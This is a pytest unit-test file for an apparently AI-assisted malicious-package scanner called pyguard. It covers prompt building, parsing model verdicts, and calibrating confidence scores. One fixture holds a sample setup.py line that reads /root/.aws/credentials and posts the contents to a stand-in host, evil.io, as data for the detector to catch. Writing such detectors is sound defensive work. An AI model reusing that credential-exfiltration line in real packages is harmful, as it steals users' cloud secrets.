"""Unit tests for Layer 2 — AIAnalysisLayer, PromptBuilder, ResponseParser strategies."""
from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from pyguard.layers.ai import (
    AIAnalysisLayer,
    JSONParser,
    PromptBuilder,
    ToolUseParser,
    _calibrate_confidence,
)
from pyguard.models import Finding, PackageInfo, PackageMetadata, PyPIRelease, Severity


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture()
def simple_package() -> PackageInfo:
    return PackageInfo(
        name="evil-pkg",
        version="1.0.0",
        source_path=Path("/tmp/evil"),
        files={"setup.py": "import requests\nrequests.post('https://evil.io', data=open('/root/.aws/credentials').read())\n"},
        metadata=PackageMetadata(
            release_history=[PyPIRelease(version="1.0.0", upload_time="2024-01-01T00:00:00Z")],
        ),
    )


@pytest.fixture()
def static_finding() -> Finding:
    return Finding(
        severity=Severity.HIGH,
        title="Credential path access",
        description="Access to ~/.aws/credentials",
        layer="static",
        package="evil-pkg",
        version="1.0.0",
        evidence={},
        confidence=0.90,
        file="setup.py",
        line=2,
        category="credential_theft",
    )


# ---------------------------------------------------------------------------
# PromptBuilder tests
# ---------------------------------------------------------------------------

class TestPromptBuilder:
    def test_with_metadata_includes_name_version(self, simple_package: PackageInfo) -> None:
        prompt = PromptBuilder().with_metadata(simple_package).build()
        assert "evil-pkg" in prompt
        assert "1.0.0" in prompt

    def test_with_taint_summary_includes_high_findings(
        self, simple_package: PackageInfo, static_finding: Finding
    ) -> None:
        prompt = (
            PromptBuilder()
            .with_metadata(simple_package)
            .with_taint_summary([static_finding])
            .build()
        )
        assert "Credential path access" in prompt

    def test_with_taint_summary_skips_low_severity(self, simple_package: PackageInfo) -> None:
        low_finding = Finding(
            severity=Severity.LOW,
            title="Low severity",
            description="not important",
            layer="static",
            package="evil-pkg",
            version="1.0.0",
            evidence={},
            confidence=0.5,
            category="general",
        )
        prompt = (
            PromptBuilder()
            .with_metadata(simple_package)
            .with_taint_summary([low_finding])
            .build()
        )
        assert "Low severity" not in prompt

    def test_with_source_files_includes_python_files(self, simple_package: PackageInfo) -> None:
        prompt = (
            PromptBuilder()
            .with_source_files(simple_package.files)
            .build()
        )
        assert "setup.py" in prompt
        assert "requests.post" in prompt

    def test_with_source_files_skips_non_python(self, simple_package: PackageInfo) -> None:
        simple_package.files["README.md"] = "# hello"  # type: ignore[misc]
        prompt = PromptBuilder().with_source_files(simple_package.files).build()
        assert "README.md" not in prompt

    def test_build_returns_non_empty_string(self, simple_package: PackageInfo) -> None:
        prompt = (
            PromptBuilder()
            .with_metadata(simple_package)
            .with_instructions()
            .build()
        )
        assert len(prompt) > 20


# ---------------------------------------------------------------------------
# JSONParser tests
# ---------------------------------------------------------------------------

class TestJSONParser:
    def test_parses_valid_json(self, simple_package: PackageInfo) -> None:
        raw = json.dumps({
            "findings": [
                {
                    "severity": "critical",
                    "title": "Credential theft",
                    "description": "Reads AWS creds",
                    "file": "setup.py",
                    "line_hint": 2,
                    "code_snippet": "open('/root/.aws/credentials')",
                    "confidence": 0.95,
                    "category": "credential_theft",
                }
            ],
            "overall_verdict": "malicious",
            "reasoning": "Steals credentials",
        })
        parser = JSONParser()
        findings, verdict, conf = parser.parse(simple_package, raw)
        assert len(findings) == 1
        assert findings[0].severity == Severity.CRITICAL
        assert verdict == "malicious"
        assert conf is not None

    def test_returns_empty_on_invalid_json(self, simple_package: PackageInfo) -> None:
        parser = JSONParser()
        findings, verdict, conf = parser.parse(simple_package, "not json {{")
        assert findings == []
        assert verdict is None
        assert conf is None

    def test_confidence_clamped_to_0_1(self, simple_package: PackageInfo) -> None:
        raw = json.dumps({
            "findings": [
                {
                    "severity": "high",
                    "title": "Test",
                    "description": "test",
                    "confidence": 99.0,
                    "category": "general",
                }
            ],
            "overall_verdict": "suspicious",
            "reasoning": "test",
        })
        parser = JSONParser()
        findings, _, _ = parser.parse(simple_package, raw)
        assert findings[0].confidence <= 1.0


# ---------------------------------------------------------------------------
# ToolUseParser tests
# ---------------------------------------------------------------------------

class TestToolUseParser:
    def test_parses_tool_input_dict(self, simple_package: PackageInfo) -> None:
        data = {
            "findings": [
                {
                    "severity": "high",
                    "title": "Exfil",
                    "description": "Sends data out",
                    "confidence": 0.88,
                    "category": "exfiltration",
                }
            ],
            "overall_verdict": "suspicious",
            "reasoning": "Network call during install",
        }
        parser = ToolUseParser()
        findings, verdict, _ = parser.parse(simple_package, json.dumps(data))
        assert findings[0].severity == Severity.HIGH
        assert verdict == "suspicious"


# ---------------------------------------------------------------------------
# Confidence calibration tests
# ---------------------------------------------------------------------------

class TestCalibrateConfidence:
    def test_corroborated_finding_gets_boosted(self, static_finding: Finding) -> None:
        ai_finding = Finding(
            severity=Severity.HIGH,
            title="AI cred finding",
            description="AI found creds",
            layer="ai",
            package="evil-pkg",
            version="1.0.0",
            evidence={},
            confidence=0.70,
            file="setup.py",
            category="credential_theft",
        )
        calibrated = _calibrate_confidence([ai_finding], [static_finding])
        # Same file → should be boosted
        assert calibrated[0].confidence > 0.70

    def test_ai_only_critical_has_floor(self) -> None:
        ai_finding = Finding(
            severity=Severity.CRITICAL,
            title="Hidden exec",
            description="exec payload",
            layer="ai",
            package="evil-pkg",
            version="1.0.0",
            evidence={},
            confidence=0.50,
            file="evil.py",
            category="obfuscation",
        )
        calibrated = _calibrate_confidence([ai_finding], [])
        assert calibrated[0].confidence >= 0.75

    def test_ai_only_low_has_ceiling(self) -> None:
        ai_finding = Finding(
            severity=Severity.LOW,
            title="Minor hint",
            description="minor",
            layer="ai",
            package="evil-pkg",
            version="1.0.0",
            evidence={},
            confidence=0.90,
            file="setup.py",
            category="general",
        )
        calibrated = _calibrate_confidence([ai_finding], [])
        assert calibrated[0].confidence <= 0.5


# ---------------------------------------------------------------------------
# AIAnalysisLayer integration (mocked API)
# ---------------------------------------------------------------------------

class TestAIAnalysisLayer:
    @pytest.mark.asyncio
    async def test_returns_empty_without_api_key(self, simple_package: PackageInfo) -> None:
        layer = AIAnalysisLayer(api_key="")
        findings = await layer.analyze(simple_package)
        assert findings == []

    @pytest.mark.asyncio
    async def test_returns_empty_for_empty_package(self) -> None:
        pkg = PackageInfo(name="empty", version="1.0.0", source_path=Path("/tmp"))
        layer = AIAnalysisLayer(api_key="sk-fake")
        findings = await layer.analyze(pkg)
        assert findings == []

    @pytest.mark.asyncio
    async def test_mocked_call_produces_findings(self, simple_package: PackageInfo) -> None:
        mock_response_data = {
            "findings": [
                {
                    "severity": "critical",
                    "title": "Steals AWS creds",
                    "description": "Reads and exfils credentials",
                    "file": "setup.py",
                    "line_hint": 2,
                    "code_snippet": "open(...).read()",
                    "confidence": 0.97,
                    "category": "credential_theft",
                }
            ],
            "overall_verdict": "malicious",
            "reasoning": "Definitive credential theft",
        }

        layer = AIAnalysisLayer(api_key="sk-fake")

        with patch.object(layer, "_call_api", new=AsyncMock(return_value=json.dumps(mock_response_data))):
            findings = await layer.analyze(simple_package)

        finding_titles = [f.title for f in findings]
        assert any("Steals AWS" in t for t in finding_titles)
        assert any(f.category == "ai_verdict" for f in findings)
